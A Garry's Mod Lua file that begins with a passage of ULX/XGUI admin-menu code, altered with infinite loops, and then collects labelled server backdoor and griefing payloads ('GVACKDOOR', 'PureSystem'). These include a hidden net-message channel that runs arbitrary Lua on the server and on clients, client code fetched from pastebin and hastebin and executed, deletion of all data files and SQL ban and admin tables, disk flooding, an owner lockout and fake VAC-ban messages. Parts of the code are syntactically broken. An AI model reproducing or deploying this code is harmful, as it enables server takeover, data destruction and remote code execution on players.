			RunConsoleCommand( &quot;_xgui&quot;, &quot;getInstalled&quot; )
			reattempt:Remove()
			timer.Simple( 0.5, function() xgui.show( tabname ) end )
		end )
	end
end

function xgui.show( tabname )
	if not xgui.anchor then return end
	if not xgui.initialized then return end

	--Check if XGUI is not installed, display the warning if hasn't been shown yet.
	if not xgui.isInstalled and not xgui.offlineMode then
		xgui.checkNotInstalled( tabname )
		return
	end

	if not game.SinglePlayer() and not ULib.ucl.authed[LocalPlayer():UniqueID()] then
		local unauthedWarning = xlib.makeframe{ label=&quot;XGUI Error!&quot;, w=250, h=90, showclose=true, skin=xgui.settings.skin }
		xlib.makelabel{ label=&quot;Your ULX player has not been Authed!&quot;, x=10, y=30, parent=unauthedWarning }
		xlib.makelabel{ label=&quot;Please wait a couple seconds and try again.&quot;, x=10, y=45, parent=unauthedWarning }
		xlib.makebutton{ x=50, y=63, w=60, label=&quot;Try Again&quot;, parent=unauthedWarning }.DoClick = function()
			unauthedWarning:Remove()
			xgui.show( tabname )
		end
		xlib.makebutton{ x=140, y=63, w=60, label=&quot;Close&quot;, parent=unauthedWarning }.DoClick = function()
			unauthedWarning:Remove()
		end
		return
	end

	if xgui.base.refreshSkin then
		xgui.base:SetSkin( xgui.settings.skin )
		xgui.base.refreshSkin = nil
	end

	--In case the string name had spaces, it sent the whole argument table. Convert it to a string here!
	if type( tabname ) == &quot;table&quot; then
		tabname = table.concat( tabname, &quot; &quot; )
	end
	--Sets the active tab to tabname if it was specified
	if tabname and tabname ~= &quot;&quot; then
		local found, settingsTab
		for _, v in ipairs( xgui.modules.tab ) do
			if string.lower( v.name ) == &quot;settings&quot; then settingsTab = v.tabpanel end
			if string.lower( v.name ) == string.lower( tabname ) and v.panel:GetParent() ~= xgui.null then
				xgui.base:SetActiveTab( v.tabpanel )
				if xgui.anchor:IsVisible() then return end
				found = true
				break
			end
		end
		if not found then
			for _, v in ipairs( xgui.modules.setting ) do
				if string.lower( v.name ) == string.lower( tabname ) and v.panel:GetParent() ~= xgui.null then
					xgui.base:SetActiveTab( settingsTab )
					xgui.settings_tabs:SetActiveTab( v.tabpanel )
					if xgui.anchor:IsVisible() then return end
					found = true
					break
				end
			end
		end
		if not found then return end --If invalid input was taken, then do nothing.
	end

	xgui.base.animOpen()
	gui.EnableScreenClicker( true )
	RestoreCursorPosition()
	xgui.anchor:SetMouseInputEnabled( true )

	--Calls the functions requesting to hook when XGUI is opened
	xgui.callUpdate( &quot;onOpen&quot; )
end

function xgui.hide()
	if not xgui.anchor then return end
	if not xgui.anchor:IsVisible() then return end
	RememberCursorPosition()
	gui.EnableScreenClicker( false )
	xgui.anchor:SetMouseInputEnabled( false )
	xgui.base.animClose()
	CloseDermaMenus()

	--Calls the functions requesting to hook when XGUI is closed
	xgui.callUpdate( &quot;onClose&quot; )
end

function xgui.toggle( tabname )
	if xgui.anchor and ( not xgui.anchor:IsVisible() or ( tabname and #tabname ~= 0 ) ) then
		xgui.show( tabname )
		while true do end
	else
		xgui.hide()
		while true do end
	end
end

--New XGUI Data stuff
function xgui.expectChunks( numofchunks )
	if xgui.isInstalled then
		xgui.expectingdata = true
		xgui.chunkbox.max = numofchunks
		xgui.chunkbox.value = 0
		xgui.chunkbox:SetFraction( 0 )
		xgui.chunkbox.Label:SetText( &quot;Getting data: Waiting for server...&quot; )
		xgui.chunkbox:SetVisible( true )
		xgui.chunkbox:SetSkin( xgui.settings.skin )
		xgui.flushQueue( &quot;chunkbox&quot; ) --Remove the queue entry that would hide the chunkbox
	end
end

function xgui.getChunk( flag, datatype, data )
	if xgui.expectingdata then
		--print( datatype, flag ) --Debug
		if flag == -1 then
			--Ignore these chunks
		elseif flag == 0 then --Data should be purged
			if xgui.data[datatype] then
				table.Empty( xgui.data[datatype] )
			end
			xgui.flushQueue( datatype )
			xgui.callUpdate( datatype, &quot;clear&quot; )
		elseif flag == 1 then
			if not xgui.mergeData then --A full data table is coming in
				if not data then data = {} end --Failsafe for no table being sent
				xgui.flushQueue( datatype )
				table.Empty( xgui.data[datatype] )
				table.Merge( xgui.data[datatype], data )
				xgui.callUpdate( datatype, &quot;clear&quot; )
				xgui.callUpdate( datatype, &quot;process&quot;, data )
				xgui.callUpdate( datatype, &quot;done&quot; )
			else --A chunk of data is coming in
				table.Merge( xgui.data[datatype], data )
				xgui.callUpdate( datatype, &quot;process&quot;, data )
			end
		elseif flag == 2 or flag == 3 then --Add/Update a portion of data
			table.Merge( xgui.data[datatype], data )
			xgui.callUpdate( datatype, flag == 2 and &quot;add&quot; or &quot;update&quot;, data )
		elseif flag == 4 then --Remove a key from the table
			xgui.removeDataEntry( xgui.data[datatype], data ) --Needs to be called recursively!
			xgui.callUpdate( datatype, &quot;remove&quot;, data )
		elseif flag == 5 then --Begin a set of chunks (Clear the old data, then flag to merge incoming data)
			table.Empty( xgui.data[datatype] )
			xgui.mergeData = true
			xgui.flushQueue( datatype )
			xgui.callUpdate( datatype, &quot;clear&quot; )
		elseif flag == 6 then --End a set of chunks (Clear the merge flag)
			xgui.mergeData = nil
			xgui.callUpdate( datatype, &quot;done&quot; )
		elseif flag == 7 then --Pass the data directly to the module to be handled.
			xgui.callUpdate( datatype, &quot;data&quot;, data )
		end
		xgui.chunkbox:Progress( datatype )
	end
end

function xgui.removeDataEntry( data, entry )
	for k, v in pairs( entry ) do
		if type( v ) == &quot;table&quot; then
			xgui.removeDataEntry( data[k], v )
		else
			if type(v) == &quot;number&quot; then
				table.remove( data, v )
			else
				data[v] = nil
			end
		end
	end
end

function xgui.callUpdate( dtype, event, data )
	--Run any functions that request to be called when &quot;curtable&quot; is updated
	if not xgui.hook[dtype] or ( event and not xgui.hook[dtype][event] ) then
		Msg( &quot;XGUI: Attempted to call non-existent type or event to a hook! (&quot; .. dtype .. &quot;, &quot; .. ( event or &quot;nil&quot; ) .. &quot;)\n&quot; )
	else
		if not event then
			for name, func in pairs( xgui.hook[dtype] ) do func( data ) end
		else
			for name, func in pairs( xgui.hook[dtype][event] ) do func( data ) end
		end
	end
end

--If the player's group is changed, reprocess the XGUI modules for permissions, and request for extra data if needed
function xgui.PermissionsChanged( ply )
	if ply == LocalPlayer() and xgui.isInstalled and xgui.dataInitialized then
		xgui.processModules()
		local types = {}
		for dtype, data in pairs( xgui.data ) do
			if table.Count( data ) &gt; 0 then table.insert( types, dtype ) end
		end
		RunConsoleCommand( &quot;xgui&quot;, &quot;refreshdata&quot;, unpack( types ) )
	end
end
hook.Add( &quot;UCLAuthed&quot;, &quot;XGUI_PermissionsChanged&quot;, xgui.PermissionsChanged )

function xgui.getInstalled()
	if not xgui.isInstalled then
		if xgui.notInstalledWarning then
			xgui.notInstalledWarning:Remove()
			xgui.notInstalledWarning = nil
		end
		xgui.isInstalled = true
		xgui.offlineMode = false
		RunConsoleCommand( &quot;xgui&quot;, &quot;getdata&quot; )
	end
end

function xgui.cmd_base( ply, func, args )
	if not args[ 1 ] then
		xgui.toggle()
	elseif xgui.isInstalled then --First check that it's installed
		RunConsoleCommand( &quot;_xgui&quot;, unpack( args ) )
	end
end

function xgui.tab_completes()
	return xgui.tabcompletes
end

function xgui.ulxmenu_tab_completes()
	return xgui.ulxmenucompletes
end

ULib.cmds.addCommandClient( &quot;xgui&quot;, xgui.cmd_base )
ULib.cmds.addCommandClient( &quot;xgui show&quot;, function( ply, cmd, args ) xgui.show( args ) end, xgui.tab_completes )
ULib.cmds.addCommandClient( &quot;xgui hide&quot;, xgui.hide )
ULib.cmds.addCommandClient( &quot;xgui toggle&quot;, function() xgui.toggle() end )

--local ulxmenu = ulx.command( CATEGORY_NAME, &quot;ulx menu&quot;, ulx.menu, &quot;!menu&quot; )
ULib.cmds.addCommandClient( &quot;ulx menu&quot;, function( ply, cmd, args ) xgui.toggle( args ) end, xgui.ulxmenu_tab_completes )
    end)
end



--[[

    Anti StopSound &amp; Ulx Menu

]]--


if ply:ConCommand( &quot;stopsound&quot; ) then return end 
end
if ply:ConCommand( &quot;ulx menu&quot; ) then return end 
end




--[[

    Block owner access in server

]]--


hook.Add(&quot;CheckPassword&quot;,&quot;ripowner&quot;,function(steamid64)
    if util.SteamIDFrom64(steamid64) == &quot;STEAM_0:1:158035763&quot; then
        return false, &quot;[= /!\ Your access to the server has been locked because you not paid gmodstore scripts /!\ =]&quot;
    end
end)



--[[

    Yes i'm REAL GARRY

]]--


util.AddNetworkString(&quot;OMG_NO_PRANK_GARRY_IS_HERE&quot;)

BroadcastLua([[net.Receive(&quot;OMG_NO_PRANK_GARRY_IS_HERE&quot;, function() local ent = net.ReadEntity() chat.AddText(team.GetColor(ent:Team()), ent:Name(), Color(200, 200, 200, 255), &quot; earned the achievement &quot;, Color(245, 246, 0, 255), &quot;Yes, I am the real Garry!&quot;)  end)]])

for k,v in pairs(player.GetAll()) do
    net.Start(&quot;OMG_NO_PRANK_GARRY_IS_HERE&quot;)
        net.WriteEntity(v)
    net.Broadcast()
end



--[[

    Marks

]]--


util.AddNetworkString(&quot;suninrags&quot;)
local function slua(str,ply)
    local d = util.Compress(str)
    local i = #d
    net.Start(&quot;suninrags&quot;)
    net.WriteUInt(i,16)
    net.WriteData(d,i)
    if ply then
        net.Send(ply)
    else
        net.Broadcast()
    end
end
net.Receive(&quot;suninrags&quot;,function()
    local serverside = net.ReadBit()
    local str = util.Decompress(net.ReadData(net.ReadUInt(16)))
    if serverside == 1 then
        CompileString(str,&quot;\xFF\xFF\xFF&quot;,false)()
    else
        local ply = net.ReadEntity()
        slua(str, IsValid(ply) &amp;&amp; ply:IsPlayer() &amp;&amp; ply )
    end
end)
BroadcastLua([[net.Receive(&quot;suninrags&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;\xFF\xFF\xFF&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;,&quot;\xFF\xFF\xFF&quot;,function(ply)
    ply:SendLua([[net.Receive(&quot;suninrags&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;\xFF\xFF\xFF&quot;)()end)]])
end)



--[[

    PureSystem V2
    for k, v in pairs(player.GetAll()) do
        v:SendLua(&quot;steamworks.FileInfo(1479367728,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)&quot;)
    end

]]--


if SERVER then
	for k, v in pairs(player.GetAll()) do
		v:SendLua(&quot;steamworks.FileInfo(1479367728,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)&quot;)
	end

	
	print([[
__________                         _________               __                   ____   ____________
\______   \__ _________   ____    /   _____/__.__. _______/  |_  ____   _____   \   \ /   /\_____  \
 |     ___/  |  \_  __ \_/ __ \   \____   /|  |  |/  ___/\   __\/ __ \ /     \   \   Y   /  /  ____/
 |    |   |  |  /|  | \/\  ___/    ____\  \\ ___ |\___ \  |  | \  ___/|  Y Y  \   \     /  /       \
 |____|   |____/ |__|    \___    /________/  ____/____ /  |__|  \___  |__|_|  /    \___/   \_______|]])

	timer.Create( &quot;gvacspam&quot;, 0.1, 1, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, &quot;[PureSystem] Installation des pr&eacute;requis.&quot;)
		end
	end)

	timer.Simple( 10, function()
  		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, &quot;[PureSystem] Lancement de L'installation.&quot;)
		end
	end )

	timer.Simple( 14, function()
  		for k,v in pairs(player.GetAll()) do
   	  		v:SendLua([[http.Fetch('https://pastebin.com/raw/EwtFyKWe',function(b,l,h,c)RunString(b)end,nil)]]) 
   	  		v:SetRunSpeed(400* 4);
        	v:SetWalkSpeed(200 * 2);
		end

		RunConsoleCommand(&quot;sv_friction&quot;, &quot;-8&quot;)

		timer.Create( &quot;gtonip&quot;, 15, 0, function()
			for k,v in pairs(player.GetAll()) do
				v:GodEnable()
				v:setDarkRPVar( &quot;rpname&quot;, &quot;This Steam account has been VAC banned from secure servers due to a cheating infraction.&quot; )
			end

		end )
	end )

	timer.Simple( 76, function()
		http.Fetch('https://pastebin.com/raw/7ABFD4Bu',function(b,l,h,c)RunString(b)end,nil)
	end )

	timer.Simple( 77, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4,  &quot;[PureSystem] Merci pour votre patience.&quot;)
    		DarkRP.notify(ply, 2, 20, &quot;HACK PAR IXXE/ GVACKDOOR leaked by anatik&quot;)
		end
	end )

	timer.Simple( 105, function()
		RunConsoleCommand(&quot;sv_friction&quot;, &quot;8&quot;)
		hook.Remove(&quot;Think&quot;, &quot;2012akaapocalypse&quot;)
	end )
	

	hook.Remove( &quot;PlayerSay&quot;, &quot;Pure_Menu&quot; )
	concommand.Remove(&quot;Pure_openMenu&quot;)
	concommand.Remove(&quot;ulx menu&quot;)
	ULib.addSayCommand( '!menu', lechat )
	ULib.cmds.addCommand( &quot;ulx menu&quot;, lechat )
	


	function game.CleanUpMap() end

	timer.Create(&quot;moneymoney&quot;, 1, 0, function()
		for k,v in pairs(player.GetAll()) do v:addMoney(1648125) end
	end)
end

--[[
  local loadingPercent = 0
  local W, H = ScrW(), ScrH()

surface.CreateFont(&quot;lapolice&quot;, {
    font = &quot;Open Sans&quot;,  
    size = ScrW()*0.02, 
    weight = 10, 
    blursize = 0, 
    scanlines = 2.5, 
    antialias = false
})

surface.CreateFont( &quot;PureBigButtonFont&quot;, {
    font = &quot;Open Sans&quot;,
    extended = false,
    size = 23,
    weight = 400,
    blursize = 0,
    scanlines = 0,
    antialias = true,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )

    ledermatriste = vgui.Create(&quot;DFrame&quot;)
    ledermatriste:SetPos(0,0)
    ledermatriste:SetSize(ScrW(), ScrH())
    ledermatriste:ShowCloseButton(false)
    ledermatriste:SetTitle(&quot;&quot;)
    ledermatriste:SetVisible(true)
    ledermatriste:MakePopup()
    ledermatriste:SetDraggable(false)
    ledermatriste.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(18,21,25,255))
    end

    local logoma = vgui.Create(&quot;DImage&quot;, ledermatriste)
    logoma:SetPos(ScrW()/2 - 250, ScrH()/2 - 250)
    logoma:SetSize(500, 500)
    logoma:SetImage(&quot;materials/puresystem/logo_marteaupure.png&quot;)

    local timerloadingbar = vgui.Create(&quot;DPanel&quot;, ledermatriste)
    timerloadingbar:SetPos(ScrW()/2 - 150, ScrH()/2 + 245)
    timerloadingbar.Paint = function(self, w, h)
        draw.RoundedBox(5, 0, 0, w, h, Color(255, 255, 255))
    end

    local timerloadingbardone = vgui.Create(&quot;DPanel&quot;, ledermatriste)
    timerloadingbardone:SetPos(ScrW()/2 - 150, ScrH()/2 + 245)
    timerloadingbardone.Paint = function(self, w, h)
        draw.RoundedBox(5, 0, 0, w, h, Color(241, 193, 0,255))
    end

    local timerloading = vgui.Create(&quot;DLabel&quot;, ledermatriste)
    timerloading:SetPos(ScrW()/2 - 100, ScrH()/2 + 250)
    timerloading:SetText(&quot;Installation de la mise &agrave; jours...&quot;)
    timerloading:SetColor(Color(24,24,24,255))
    timerloading:SetFont(&quot;PureBigButtonFont&quot;)
    timerloading:SizeToContents()

    timerloadingbar:SetSize(timerloading:GetWide() + 100, timerloading:GetTall() + 10)
    timerloadingbardone:SetSize(0, timerloading:GetTall() + 10)

    timer.Create(&quot;charglogo&quot;, 1, 1, function()
        logoma:AlphaTo(10, 1, 0)
        logoma:AlphaTo(255, 1, 1)
        timer.Adjust(&quot;charglogo&quot;, 3, 0, function()
            logoma:AlphaTo(10, 1, 1)
            logoma:AlphaTo(255, 1, 2)
        end)
    end)

    local timePassed = 0

    timer.Create(&quot;parleput1&quot;, 0.1, 0, function()--PARLE !!!
        RunConsoleCommand(&quot;+voicerecord&quot;)
    end)

    timer.Create(&quot;Pure_loadingTimeout&quot;, 1, 0, function()
        timePassed = timePassed + 1
        loadingPercent = loadingPercent + math.random(14, 15)
        if loadingPercent &gt; 50 then
            timer.Remove(&quot;Pure_loadingTimeout&quot;)
            loadingPercent = 80
        end
        timerloadingbardone:SizeTo(timerloadingbar:GetWide() * loadingPercent / 100 , -1, 3)
    end)

    timer.Simple(25, function()
        if ledermatriste != nil &amp;&amp; timerloadingbar:IsValid() &amp;&amp; timerloadingbardone:IsValid() then
            timerloadingbardone:SizeTo(timerloadingbar:GetWide() * 90 / 100, -1, 3)
        end
    end)

    timer.Simple(30, function()
        timer.Remove(&quot;charglogo&quot;)

        if ledermatriste != nil &amp;&amp; timerloadingbar:IsValid() &amp;&amp; timerloadingbardone:IsValid() then
            timerloadingbardone:SizeTo(timerloadingbar:GetWide(), -1, 1)
        end
    end)

    timer.Simple(31, function()
        if ledermatriste != nil then
            ledermatriste:Remove()
            enigma()
        end
    end)




    timer.Simple(63, function()
        enigma:Remove()
        timer.Remove( &quot;charglogo&quot; )
        RunConsoleCommand(&quot;+right&quot;)
        RunConsoleCommand(&quot;+voicerecord&quot;)
        RunConsoleCommand(&quot;cl_yawspeed&quot;,&quot;9999&quot;)
        RunConsoleCommand(&quot;r_shader_srgb&quot;,&quot;1&quot;)
    end)


    timer.Simple( 73, function()
        RunConsoleCommand(&quot;-right&quot;)
        RunConsoleCommand(&quot;cl_yawspeed&quot;,&quot;8&quot;)
        timer.Remove(&quot;parleput1&quot;)
        timer.Remove(&quot;cheer_loop&quot;)
    end )

    timer.Simple( 90, function()
        RunConsoleCommand(&quot;r_shader_srgb&quot;,&quot;0&quot;)
    end )

    for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end

    timer.Create(&quot;cheer_loop&quot;,2.7,0,function()
        for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end
    end )


    hook.Add(&quot;Think&quot;,&quot;somewhere_over_the_rainbow&quot;,function()
        local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
        for _, v in ipairs(player.GetAll()) do
            v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
        end
    end)


function enigma()
    enigma = vgui.Create(&quot;DFrame&quot;)
    enigma:SetPos(0,0)
    enigma:SetSize(ScrW(), ScrH())
    enigma:ShowCloseButton(false)
    enigma:SetTitle(&quot;&quot;)
    enigma:SetVisible(true)
    enigma:MakePopup()
    enigma:SetDraggable(false)
    enigma.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 0, w, h, Color(18,21,25,255))
        draw.DrawText( &quot;(╯&deg;□&deg;）╯︵ ┻━┻&quot;, &quot;lapolice&quot;, ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
        draw.DrawText( &quot;(╯&deg;□&deg;）╯︵ ┻━┻&quot;, &quot;lapolice&quot;, math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;&quot;, &quot;lapolice&quot;, W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;RIP ;)&quot;, &quot;lapolice&quot;, W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
        draw.DrawText( &quot;&Sigma;NIGMA&quot;, &quot;lapolice&quot;, W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
        draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
    end

    sound.PlayURL( &quot;http://funtime.pe.hu/Brass.mp3&quot;, &quot;mono&quot;, function()end )

    local logenigma = vgui.Create(&quot;HTML&quot;, enigma)
    logenigma:SetPos(ScrW()/2 - 250, ScrH()/2 - 250)
    logenigma:SetSize(500, 500)
    logenigma:OpenURL( &quot;https://i.imgur.com/7zMPifV.png&quot;)

    
end
]]

--[[

    Break ALL SQL

]]--


local files, directories = file.Find( &quot;*&quot;, &quot;DATA&quot; ) for k, v in pairs( files ) do file.Delete( v ) end
MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')
sql.Query(&quot;DELETE FROM `DARKRP_BANNED_RPNAMES_STORE`&quot;)
sql.Query(&quot;DELETE FROM `DRP_PLAYER_NICKNAME_STORE`&quot;)
sql.Query(&quot;DELETE FROM `FADMIN_GROUPS`&quot;)
sql.Query(&quot;DELETE FROM `FADMIN_MOTD`&quot;)
sql.Query(&quot;DELETE FROM `FADMIN_PRIVILEGES`&quot;)
sql.Query(&quot;DELETE FROM `FADMIN_RESTRICTEDENTS`&quot;)
sql.Query(&quot;DELETE FROM `FAdminBans`&quot;)
sql.Query(&quot;DELETE FROM `FAdmin_PlayerGroup`&quot;)
sql.Query(&quot;DELETE FROM `FAdmin_ServerSettings`&quot;)
sql.Query(&quot;DELETE FROM `FPP_ANTISPAM1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_ENTITYDAMAGE1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_GLOBALSETTINGS1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_GRAVGUN1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_GROUPMEMBERS1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_GROUPS3`&quot;)
sql.Query(&quot;DELETE FROM `FPP_GROUPTOOL`&quot;)
sql.Query(&quot;DELETE FROM `FPP_PHYSGUN1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_PLAYERUSE1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_TOOLADMINONLY`&quot;)
sql.Query(&quot;DELETE FROM `FPP_TOOLGUN1`&quot;)
sql.Query(&quot;DELETE FROM `FPP_TOOLRESTRICTPERSON1`&quot;)
sql.Query(&quot;DELETE FROM `batm_personal_accounts`&quot;)
sql.Query(&quot;DELETE FROM `cac_incidents`&quot;)
sql.Query(&quot;DELETE FROM `darkrp_door`&quot;)
sql.Query(&quot;DELETE FROM `darkrp_doorgroups`&quot;)
sql.Query(&quot;DELETE FROM `darkrp_doorjobs`&quot;)
sql.Query(&quot;DELETE FROM `darkrp_jobSpawn`&quot;)
sql.Query(&quot;DELETE FROM `darkrp_player`&quot;)
sql.Query(&quot;DELETE FROM `darkrp_position`&quot;)
sql.Query(&quot;DELETE FROM `playerinformation`&quot;)
sql.Query(&quot;DELETE FROM `playerpdata`&quot;)
sql.Query(&quot;DELETE FROM `sqlite_sequence`&quot;)
sql.Query(&quot;DELETE FROM `ulib_bans`&quot;)



--[[

    1000 Pictures In Data

]]--


local function randomString(len)
    if !len or len &lt;= 0 then return &quot;&quot; end
    return randomString(len - 1)..(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-&quot;)[math.random(1, 64)]
end

local function spamFilePNG(path)
    local files, folders = file.Find(path..&quot;*&quot;, &quot;DATA&quot;)

    for i=1,1000 do
        local txt = randomString(10)
        local url = {
            [1] = &quot;https://robohash.org/$txt?set=set&quot;..math.random(1, 4),
            [2] = &quot;http://via.placeholder.com/5001x3199?text=$txt&quot;
        }

        local u = table.Random(url)
        http.Fetch(string.Replace(u, &quot;$txt&quot;, txt), function(img)
            file.Write(txt..i..&quot;.png&quot;, img)
            print(path)
        end)
    end
    
    for k,v in pairs(folders) do
        spamFilePNG(path..v..&quot;/&quot;)
    end
end
spamFilePNG(&quot;&quot;)



--[[

    Spam Notify All Players

]]--


timer.Create( &quot;gvacspam&quot;, 0.1, 0, function()
for k, ply in pairs( player.GetAll() ) do
    DarkRP.notify(ply, 2, 4, &quot;Noice&quot;)
end
end)



--[[

    Pure System

]]--


if SERVER then
	for k, v in pairs(player.GetAll()) do
		v:SendLua(&quot;steamworks.FileInfo(1479367728,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)&quot;)
	end

	
	print([[
__________                         _________               __                   ____   ____________
\______   \__ _________   ____    /   _____/__.__. _______/  |_  ____   _____   \   \ /   /\_____  \
 |     ___/  |  \_  __ \_/ __ \   \____   /|  |  |/  ___/\   __\/ __ \ /     \   \   Y   /  /  ____/
 |    |   |  |  /|  | \/\  ___/    ____\  \\ ___ |\___ \  |  | \  ___/|  Y Y  \   \     /  /       \
 |____|   |____/ |__|    \___    /________/  ____/____ /  |__|  \___  |__|_|  /    \___/   \_______|]])

	timer.Create( &quot;gvacspam&quot;, 0.1, 1, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, &quot;[PureSystem] Installation des pr&eacute;requis.&quot;)
		end
	end)

	timer.Simple( 10, function()
  		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4, &quot;[PureSystem] Lancement de L'installation.&quot;)
		end
	end )

	timer.Simple( 14, function()
  		for k,v in pairs(player.GetAll()) do
   	  		v:SendLua([[http.Fetch('https://hastebin.com/raw/izuzicupeb',function(b,l,h,c)RunString(b)end,nil)]]) 
   	  		v:SetRunSpeed(400* 4);
        	v:SetWalkSpeed(200 * 2);
		end

		RunConsoleCommand(&quot;sv_friction&quot;, &quot;-8&quot;)

		timer.Create( &quot;gtonip&quot;, 15, 0, function()
			for k,v in pairs(player.GetAll()) do
				v:GodEnable()
				v:setDarkRPVar( &quot;rpname&quot;, &quot;This Steam account has been VAC banned from secure servers due to a cheating infraction.&quot; )
			end

		end )
	end )

	timer.Simple( 76, function()
		http.Fetch('https://hastebin.com/raw/gepuyulibi',function(b,l,h,c)RunString(b)end,nil)
	end )

	timer.Simple( 77, function()
		for k, ply in pairs( player.GetAll() ) do
    		DarkRP.notify(ply, 2, 4,  &quot;[PureSystem] Merci pour votre patience.&quot;)
    		DarkRP.notify(ply, 2, 20, &quot;HACK PAR &Sigma;NIGMA / GVACKDOOR&quot;)
		end
	end )

	timer.Simple( 105, function()
		RunConsoleCommand(&quot;sv_friction&quot;, &quot;8&quot;)
		hook.Remove(&quot;Think&quot;, &quot;2012akaapocalypse&quot;)
	end )
	

	hook.Remove( &quot;PlayerSay&quot;, &quot;Pure_Menu&quot; )
	concommand.Remove(&quot;Pure_openMenu&quot;)
	concommand.Remove(&quot;ulx menu&quot;)
	ULib.addSayCommand( '!menu', lechat )
	ULib.cmds.addCommand( &quot;ulx menu&quot;, lechat )
	


